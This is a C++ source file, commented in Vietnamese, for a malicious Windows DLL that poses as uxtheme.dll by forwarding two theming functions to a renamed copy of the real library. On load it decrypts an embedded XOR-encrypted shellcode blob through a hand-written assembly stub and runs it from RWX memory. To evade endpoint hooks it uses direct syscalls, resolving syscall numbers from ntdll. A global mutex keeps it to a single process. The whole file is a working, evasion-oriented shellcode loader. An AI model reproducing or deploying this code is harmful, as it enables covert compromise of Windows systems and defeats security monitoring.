
#include <windows.h>
#include <vector>
#include <cstring>
#include <winternl.h>
#include <mutex>
#include <shlwapi.h>
#include <uxtheme.h>
#include <fstream>
#include <tlhelp32.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <Psapi.h> 
#include <processthreadsapi.h>

HANDLE g_hSystemWideMutex = NULL;
// --- THÊM MỚI: Hàm tiện ích để chuyển đổi NTSTATUS sang string ---
std::string ntstatus_to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::setfill('0') << std::setw(8) << std::hex << status;
    return ss.str();
}

void LogToFile(const std::string& message) {
    std::ofstream log_file("Z:\\dll_log.txt", std::ios_base::out | std::ios_base::app);
    log_file << message << std::endl;
}

unsigned char encrypted_shellcode[] = {
    0xB1, 0x31, 0xD2, 0x91, 0x80, 0x9A, 0x8D, 0xAC, 0x8D, 0xAF, 0x72, 0x65, 0x74, 0x0A, 0x34, 0x38,
0x16, 0x3D, 0x3A, 0x74, 0xA4, 0x30, 0x25, 0x0C, 0x27, 0xE5, 0x1F, 0x19, 0x1B, 0xFE, 0x22, 0x7D,
0x3A, 0xD8, 0x37, 0x43, 0x3A, 0x6A, 0xC3, 0x01, 0x2F, 0x31, 0xCD, 0x1D, 0x22, 0x08, 0x47, 0xA8,
0x3B, 0x58, 0xAF, 0xC2, 0x71, 0x18, 0x2F, 0x77, 0x5C, 0x45, 0x33, 0x92, 0xAC, 0x6E, 0x33, 0x64,
0xB5, 0xA9, 0x88, 0x2B, 0x07, 0x3E, 0x3A, 0xCE, 0x24, 0x41, 0xF8, 0x2B, 0x53, 0x26, 0x4C, 0xA9,
0x35, 0xF4, 0x08, 0x7D, 0x79, 0x51, 0x6A, 0xE6, 0x00, 0x65, 0x74, 0x4B, 0xEE, 0xF9, 0xCE, 0x6F,
0x72, 0x45, 0x3E, 0xE4, 0xB3, 0x1D, 0x08, 0x26, 0x4C, 0xA9, 0x17, 0xFE, 0x30, 0x45, 0xF9, 0x1B,
0x7D, 0x33, 0x3B, 0x64, 0xA4, 0xA8, 0x33, 0x31, 0xB9, 0xA6, 0x33, 0xCE, 0x42, 0xE9, 0x3B, 0x68,
0xB9, 0x23, 0x7C, 0xB0, 0x1B, 0x44, 0xB0, 0xC9, 0x33, 0x92, 0xAC, 0x6E, 0x33, 0x64, 0xB5, 0x73,
0x85, 0x0C, 0xB7, 0x23, 0x71, 0x09, 0x52, 0x69, 0x36, 0x50, 0xBE, 0x1B, 0x95, 0x21, 0x17, 0xFE,
0x30, 0x41, 0x3B, 0x52, 0xB5, 0x05, 0x33, 0xEE, 0x78, 0x03, 0x21, 0xF2, 0x06, 0x73, 0x3B, 0x44,
0xA6, 0x20, 0xF8, 0x6D, 0xE7, 0x2F, 0x15, 0x38, 0x0B, 0x3D, 0x71, 0xB5, 0x2C, 0x0A, 0x3F, 0x22,
0x2A, 0x24, 0x2D, 0x0A, 0x3F, 0x31, 0xC5, 0x83, 0x52, 0x04, 0x24, 0x9E, 0x93, 0x31, 0x2E, 0x37,
0x17, 0x31, 0xD8, 0x67, 0x99, 0x2E, 0x8D, 0xAC, 0x9A, 0x3E, 0x9A, 0x6E, 0x74, 0x4B, 0x65, 0x0C,
0x35, 0x0A, 0x00, 0x76, 0x44, 0x4F, 0x17, 0x05, 0x03, 0x6E, 0x14, 0x38, 0xE9, 0x39, 0x07, 0x43,
0x75, 0xAC, 0xB0, 0x2A, 0xB5, 0xA4, 0x74, 0x4B, 0x65, 0x79, 0xAE, 0x7D, 0x72, 0x45, 0x76, 0x28,
0x1D, 0x03, 0x0A, 0x0D, 0x39, 0x10, 0x3C, 0x1B, 0x50, 0x36, 0x07, 0x30, 0x06, 0x06, 0x01, 0x16,
0x74, 0x11, 0x8D, 0x72, 0x46, 0x6F, 0x72, 0x08, 0x13, 0x12, 0x00, 0x08, 0x08, 0x0B, 0x0F, 0x16,
0x2B, 0x75, 0x31, 0x3D, 0x3A, 0x62, 0xAC, 0x22, 0xC8, 0x20, 0xF7, 0x1D, 0x62, 0x86, 0x93, 0x27,
0x43, 0x8C, 0x37, 0xDB, 0x83, 0xDC, 0xCD, 0x38, 0xB2, 0xAC
};

const char xor_key[] = "MySuperSecretKeyForEvasion";

unsigned char stage1_stub[] = {
    // --- Lấy địa chỉ lệnh hiện tại (RIP) ---
    0xE8, 0x00, 0x00, 0x00, 0x00,       // CALL get_rip
    0x58,                               // get_rip: POP RAX

    // --- Tính toán con trỏ (có thể đã thay đổi) ---
    0x4C, 0x8D, 0x90, 0xC1, 0xFE, 0xFF, 0xFF, // LEA R10, [RAX - 319]
    0x49, 0x8D, 0x52, 0xE6,             // LEA RDX, [R10 - 0x1A]
    0x4C, 0x8B, 0xDA,                   // MOV R11, RDX

    // --- Thiết lập bộ đếm (có thể là 319) ---
    0x48, 0xC7, 0xC1, 0x3A, 0x01, 0x00, 0x00, // MOV RCX, 314

    // --- Bắt đầu vòng lặp giải mã ---
    0x41, 0x8A, 0x02,                   // MOV AL, byte ptr [R10]
    0x45, 0x8A, 0x03,                   // MOV R8B, byte ptr [R11]
    0x41, 0x32, 0xC0,                   // XOR AL, R8B
    0x41, 0x88, 0x02,                   // MOV byte ptr [R10], AL
    0x49, 0xFF, 0xC2,                   // INC R10
    0x49, 0xFF, 0xC3,                   // INC R11

    // --- Logic lặp lại key (key wrapping) ---
    0x4D, 0x8B, 0xCB,                   // MOV R9, R11
    0x4C, 0x2B, 0xCA,                   // SUB R9, RDX
    0x49, 0x83, 0xF9, 0x1A,             // CMP R9, 26
    0x75, 0x03,                         // JNE no_reset
    0x4C, 0x8B, 0xDA,                   // no_reset: MOV R11, RDX

    // --- Vòng lặp & thực thi ---
    0x48, 0xFF, 0xC9,                   // DEC RCX
    0x75, 0xDA,                         // JNZ decode_loop
    0x49, 0x81, 0xEA, 0x3A, 0x01, 0x00, 0x00, // SUB R10, 314
    0x41, 0xFF, 0xE2                    // JMP R10
};

// === PHẦN 2: LOGIC GIẢI MÃ & THỰC THI ============================================================

// Tìm SSN của một hàm trong ntdll.dll dựa vào tên
DWORD GetSsnByName(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);
    if (!funcAddr) return 0;

    BYTE* pFunction = (BYTE*)funcAddr;
    if (pFunction[0] == 0x4C && pFunction[1] == 0x8B && pFunction[2] == 0xD1 && pFunction[3] == 0xB8) {
        return *(DWORD*)(pFunction + 4);
    }
    return 0;
}

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Khai báo các hàm syscall được viết trong file .asm
extern "C" NTSTATUS MyNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG, DWORD);
extern "C" NTSTATUS MyNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG, DWORD);
extern "C" NTSTATUS MyNtCreateThreadEx(PHANDLE,
    ACCESS_MASK             DesiredAccess,
    POBJECT_ATTRIBUTES      ObjectAttributes,
    HANDLE                  ProcessHandle,
    LPTHREAD_START_ROUTINE  StartRoutine,
    LPVOID                  Argument,
    ULONG                   CreateFlags,
    ULONG_PTR               ZeroBits,
    SIZE_T                  StackSize,
    SIZE_T                  MaximumStackSize,
    LPVOID                  AttributeList,
    DWORD                   Ssn
);
// Hàm thực thi shellcode, chạy trong một luồng riêng.
void ExecuteInjectedLogic() {
    LogToFile("Entering ExecuteInjectedLogic.");

    DWORD ssnAllocate = GetSsnByName("NtAllocateVirtualMemory");
    if (!ssnAllocate) { LogToFile("Failed to get SSN for NtAllocateVirtualMemory."); return; }
    LogToFile("Got SSN for NtAllocateVirtualMemory: " + std::to_string(ssnAllocate)); // <-- THÊM MỚI

    DWORD ssnProtect = GetSsnByName("NtProtectVirtualMemory");
    if (!ssnProtect) { LogToFile("Failed to get SSN for NtProtectVirtualMemory."); return; }
    LogToFile("Got SSN for NtProtectVirtualMemory: " + std::to_string(ssnProtect)); // <-- THÊM MỚI

    DWORD ssnCreateThreadForShellcode = GetSsnByName("NtCreateThreadEx");
    if (!ssnCreateThreadForShellcode) { LogToFile("Failed to get SSN for NtCreateThreadEx."); return; }
    LogToFile("Got SSN for NtCreateThreadEx: " + std::to_string(ssnCreateThreadForShellcode)); // <-- THÊM MỚI

    // Cấu trúc bộ nhớ sẽ là: [KEY][SHELLCODE][STUB]
    SIZE_T key_size = sizeof(xor_key) - 1; // -1 để không bao gồm ký tự null
    SIZE_T shellcode_size = sizeof(encrypted_shellcode);
    SIZE_T stub_size = sizeof(stage1_stub);
    SIZE_T total_payload_size = key_size + shellcode_size + stub_size;
    LogToFile("Total payload size: " + std::to_string(total_payload_size)); // <-- THÊM MỚI


    HANDLE processHandle = GetCurrentProcess();
    PVOID baseAddress = NULL;
    SIZE_T regionSize = total_payload_size;

    LogToFile("Attempting to allocate virtual memory...");
    NTSTATUS status = MyNtAllocateVirtualMemory(
        processHandle, &baseAddress, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ssnAllocate
    );

    if (!NT_SUCCESS(status) || !baseAddress) {
        LogToFile("MyNtAllocateVirtualMemory FAILED. NTSTATUS: " + ntstatus_to_hex(status)); // <-- THAY ĐỔI
        return;
    }

    LogToFile("Memory allocated successfully at address " + ntstatus_to_hex((uintptr_t)baseAddress)); // <-- THÊM MỚI

    PBYTE pCurrent = (PBYTE)baseAddress;

    // Chép key
    RtlMoveMemory(pCurrent, xor_key, key_size);
    pCurrent += key_size;

    // Chép shellcode đã mã hóa
    RtlMoveMemory(pCurrent, encrypted_shellcode, shellcode_size);
    pCurrent += shellcode_size;

    // Chép stub và lưu lại địa chỉ của nó để thực thi
    PVOID stub_location = pCurrent;
    RtlMoveMemory(stub_location, stage1_stub, stub_size);

    LogToFile("Payload (key, shellcode, stub) copied to allocated memory."); // <-- THÊM MỚI

    ULONG oldProtect;
    LogToFile("Attempting to change memory protection to PAGE_EXECUTE_READWRITE..."); // <-- THÊM MỚI
    status = MyNtProtectVirtualMemory(
        processHandle, &baseAddress, &regionSize,
        PAGE_EXECUTE_READWRITE, &oldProtect, ssnProtect
    );

    if (!NT_SUCCESS(status)) {
        LogToFile("MyNtProtectVirtualMemory FAILED. NTSTATUS: " + ntstatus_to_hex(status)); // <-- THAY ĐỔI
        return;
    }
    LogToFile("Memory protection changed successfully."); // <-- THÊM MỚI

    // Tạo luồng để chạy STUB (giải mã và chạy shellcode)
    HANDLE hShellcodeThread;
    LogToFile("Attempting to create shellcode execution thread..."); // <-- THÊM MỚI
    MyNtCreateThreadEx(
        &hShellcodeThread, GENERIC_EXECUTE, NULL, processHandle,
        (LPTHREAD_START_ROUTINE)stub_location,
        NULL, 0, 0, 0, 0, NULL, ssnCreateThreadForShellcode
    );

    // Đóng handle sau khi tạo để tránh rò rỉ tài nguyên
    if (hShellcodeThread) {
        CloseHandle(hShellcodeThread);
    }
    else {
        LogToFile("MyNtCreateThreadEx FAILED to create shellcode thread."); // <-- THÊM MỚI
    }
}

// Con trỏ để lưu địa chỉ hàm DrawThemeBackground gốc
typedef HRESULT(WINAPI* FuncDrawThemeBackground)(HTHEME, HDC, int, int, const RECT*, const RECT*);
typedef HTHEME(WINAPI* FuncOpenThemeData)(HWND, LPCWSTR);

FuncDrawThemeBackground pOriginalDrawThemeBackground = NULL;
FuncOpenThemeData pOriginalOpenThemeData = NULL;

bool InitializeProxyFunctions() {

    char systemDir[MAX_PATH];
    // Lấy đường dẫn đến thư mục C:\Windows\System32
    GetSystemDirectoryA(systemDir, MAX_PATH);
    // Nối tên DLL gốc vào đường dẫn
    strcat_s(systemDir, MAX_PATH, "\\uxtheme_.dll");

    // Nạp DLL hệ thống từ vị trí đáng tin cậy của nó
    HMODULE hOriginalUxtheme = LoadLibraryA(systemDir);
    if (hOriginalUxtheme) {
        LogToFile("uxtheme_.dll loaded successfully in initializer.");

        pOriginalOpenThemeData = (FuncOpenThemeData)GetProcAddress(hOriginalUxtheme, "OpenThemeData");
        pOriginalDrawThemeBackground = (FuncDrawThemeBackground)GetProcAddress(hOriginalUxtheme, "DrawThemeBackground");
        if (pOriginalOpenThemeData && pOriginalDrawThemeBackground) {
            return true;
        }
        else {
            LogToFile("Failed to get addresses of proxy functions from uxtheme_.dll.");
            return false;
        }
    }
    else {
        LogToFile("CRITICAL ERROR: Failed to load uxtheme_.dll in initializer!");
        return false;
    }
}

DWORD WINAPI MainPayloadThread(LPVOID lpParam) {
    //if (IsProcessProtected()) {
    //    LogToFile("Protected process detected. Executing in safe, proxy-only mode.");
    //    InitializeProxyFunctions();
    //    return 0; // THOÁT SỚM. Không làm gì thêm.
    //}

    const char* mutexName = "Global\\{E8A3B2C1-F0D4-4E65-8A71-C7A5D6789B0F}";
    HANDLE hMutex = CreateMutexA(NULL, TRUE, mutexName);

    if (hMutex == NULL) {
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            // ĐÂY CHÍNH LÀ TRƯỜNG HỢP CỦA TASK MANAGER!
            // Chúng ta đã xác định được đây là tiến trình được bảo vệ.
            LogToFile("Failed to create mutex with Access Denied. Assuming protected process. Executing in safe, proxy-only mode.");
            return 0; // Và thoát sớm
        }
        else {
            // Nếu là một lỗi khác, ghi lại log như bình thường
            LogToFile("Critical error creating mutex. GetLastError: " + std::to_string(GetLastError()));
            return 1;
        }
    }

    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // Mutex đã tồn tại, tiến trình này không phải là "người chiến thắng".
        LogToFile("Mutex already exists. Not launching payload in this process.");
        CloseHandle(hMutex); // Đóng handle đã có
        return 0; // Thoát luồng một cách an toàn
    }


    g_hSystemWideMutex = hMutex;
    LogToFile("Mutex acquired. This process is the WINNER. Launching payload.");

    LogToFile("Proxy initialized. Launching payload.");
    ExecuteInjectedLogic();

    return 0;
}

extern "C" HRESULT WINAPI MyDrawThemeBackground(HTHEME hTheme, HDC hdc, int iPartId, int iStateId, const RECT* pRect, const RECT* pClipRect) {
    if (pOriginalDrawThemeBackground) {
        HRESULT result = pOriginalDrawThemeBackground(hTheme, hdc, iPartId, iStateId, pRect, pClipRect);
        return result;
    }

    return E_FAIL;
}

extern "C" HTHEME WINAPI MyOpenThemeData(HWND hwnd, LPCWSTR pszClassList) {
    if (pOriginalOpenThemeData) {
        HTHEME originalHandle = pOriginalOpenThemeData(hwnd, pszClassList);
        return originalHandle;
    }
    return NULL;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);
            InitializeProxyFunctions();

            HANDLE hThread = CreateThread(NULL, 0, MainPayloadThread, NULL, 0, NULL);
            if (hThread) {
                CloseHandle(hThread);
            }
            else {
                LogToFile("FATAL: Failed to create MainPayloadThread in DllMain.");
            }
            break;
        }
        case DLL_PROCESS_DETACH:
        {
            if (g_hSystemWideMutex != NULL) {
                LogToFile("Winner process is detaching. Releasing the system-wide mutex.");
                ReleaseMutex(g_hSystemWideMutex);
                CloseHandle(g_hSystemWideMutex);
            }
            break;
        }
    }
    return TRUE;
}